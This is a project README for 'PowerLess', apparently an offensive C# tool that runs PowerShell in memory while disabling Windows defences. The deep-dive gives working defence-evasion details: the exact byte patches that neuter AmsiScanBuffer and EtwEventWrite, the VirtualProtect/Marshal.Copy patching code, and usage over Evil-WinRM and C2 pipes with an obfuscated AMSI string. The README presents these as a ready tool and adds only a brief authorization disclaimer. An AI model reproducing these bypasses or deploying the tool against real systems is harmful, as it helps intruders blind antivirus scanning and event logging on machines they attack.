# PowerLess

<img width="869" height="127" alt="{1CB1C93D-29B1-4DE1-963E-97017BC36661}" src="https://github.com/user-attachments/assets/e44abf59-6616-4f50-9421-9cd3e68eada8" />

**PowerLess** is a standalone, reflective PowerShell execution engine wrapper built in native C#. It bypasses standard process-based telemetry, execution policy controls, and environment tracking by dynamically hosting a localized PowerShell runspace directly within its own memory allocation.

By loading the underlying engine components straight out of the native Windows Global Assembly Cache (GAC) and applying surgical pre-flight memory patches, it completely decouples execution from `powershell.exe`. The result is a clean, dependency-free binary optimized for seamless integration across interactive consoles and headless network pipes alike.

---

## 🎯 Features

* **Reflective GAC Engine Hijacking:** Dynamically maps and resolves `System.Management.Automation` from the host operating system's Global Assembly Cache. It runs completely standalone without shipping bulky runtimes or third-party SDK packages.
* **Pre-Flight Memory Blinding:** Applies native Win32 memory patches (`VirtualProtect` and `Marshal.Copy`) to bypass AMSI (`AmsiScanBuffer`) and terminate event logging (`EtwEventWrite`) in user-mode space before the execution environment is spun up.
* **Dual-Track Stream Architecture:** Automatically adapts its operational environment. It switches seamlessly between a polled, non-blocking interactive REPL loop for local sessions and a single-shot Command Mode built to prevent hanging over headless remote endpoints.
* **Deadlock-Proof Pipe Control:** Discards classic buffered console streams in favor of direct `StreamReader` / `StreamWriter` configurations with explicit auto-flushing, guaranteeing real-time data synchronization over asynchronous protocols like WinRM.
* **Unconstrained Session State:** Explicitly forces an instanced `InitialSessionState` using strongly typed enums parsed on the fly, unlocking `FullLanguage` mode and applying an absolute execution policy `Bypass` under the radar.
* **Isolated Error Capturing:** Intercepts the engine's distinct error stream blocks via dynamic reflection, aggregating runtime script faults into the execution output without triggering host console error alerts.

---

## 📦 Requirements & Compilation

PowerLess targets standard legacy architectures natively available across modern Windows deployments. It requires zero external deployment packages.

* **Target Framework:** `.NET Framework 4.8` (or any compatible standard Windows CLR environment)
* **Build Configuration:** Compiles down to a tiny standalone executable file (measured in Kilobytes, not Megabytes).

---

## 🚀 Usage

### 1. Headless Command Mode (Optimized for Evil-WinRM / C2 Pipes)

To execute scripts or utility tasks over a non-interactive network pipe without risking thread lockups or input deadlocks, pass your payload directly as an argument. The framework executes the string, flushes the stream, and exits cleanly.

```powershell
*Evil-WinRM* PS C:\Windows\Temp> .\PowerLess.exe $('echo amsi'+'Utils')
*Evil-WinRM* PS C:\Windows\Temp> .\PowerLess.exe 'Get-Process | Where-Object {$_.SI -eq (Get-Process -Id $PID).SessionId}'
*Evil-WinRM* PS C:\Windows\Temp> .\PowerLess.exe '$PSVersionTable.PSVersion'
```

### 2. Interactive REPL Mode (Local Console / TTY)

When spawned inside an interactive terminal session where input redirection is not present, PowerLess drops directly into a persistent ghost shell that retains local variables, paths, and environment configurations.

```powershell
C:\Windows\Temp> .\PowerLess.exe

PS C:\Windows\Temp> whoami
local\Administrator
PS C:\Windows\Temp> exit
```

---

## Deep-Dive

### Reflective Runspace Injection (GAC Resolution)

Standard tools frequently break because they hardcode file system paths or pull localized SDK libraries that flag security boundaries. PowerLess leverages the Common Language Runtime (CLR) assembly loader to pull code directly from the Windows core assembly directory using its cryptographic identity token:

```csharp
string assemblyName = "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
Assembly psAssembly = Assembly.Load(assemblyName);
```

This grants access to the native production engine across any Windows platform out of the box while avoiding disk-based scanning tools looking for non-standard administrative libraries.

### Pre-Flight Memory Patching

Before the pipeline runs its first script, the application uses P/Invoke wrappers to hook core security dynamic link libraries loaded in the current process space.

#### 1. AMSI Subversion

The runtime queries `amsi.dll` for `AmsiScanBuffer` and forces the function to exit immediately with an access denied code (`0x80070005`), causing the engine to bypass scanning operations completely:

* **Patch Payload:** `MOV EAX, 0x80070005; RET` (`0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3`)

#### 2. ETW Telemetry Suppression

The runtime updates `ntdll.dll` by locating `EtwEventWrite`. It overwrites the very first byte of the function logic with an architecture-neutral return command. This stops the engine from feeding behavioral telemetry up to kernel-space Event Tracing consumers or listening EDR sensors:

* **Patch Payload:** `RET` (`0xC3`)

```csharp
uint oldProtect;
VirtualProtect(lpAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
Marshal.Copy(patch, 0, lpAddress, patch.Length);
VirtualProtect(lpAddress, (UIntPtr)patch.Length, oldProtect, out _);
```

### Headless Synchronization and Stream Polling

Traditional interactive shells often rely on blocking input calls such as `Console.ReadLine()`. While this works well for local terminals, remote execution environments such as WinRM may benefit from a different input model, particularly when the application needs to remain responsive while waiting for incoming data.

PowerLess uses a simple stream-polling mechanism before invoking a blocking read:

```csharp
while (inputStream.Peek() == -1)
{
    System.Threading.Thread.Sleep(100);
}
string input = inputStream.ReadLine();
```

Rather than immediately entering `ReadLine()`, the application first checks whether data is available on the input stream. If no data is present, the thread briefly sleeps and retries. This reduces unnecessary CPU utilization and allows the application to defer the blocking read until at least one character has arrived.

Once input becomes available, the data is read, processed through the command-dispatch layer, and the resulting output is written back to the remote stream and flushed to the client.

This approach does not eliminate blocking entirely. `ReadLine()` will still wait for a line terminator once data is available but it provides a lightweight mechanism for monitoring stream activity before entering a blocking read operation.

---

## ⚠️ Disclaimer

This is developed strictly for authorized usage. Always obtain explicit written authorization before deploying memory-patching execution runspaces within production target environments.

---

**Author:** [tralsesec](https://github.com/tralsesec)

**License:** MIT
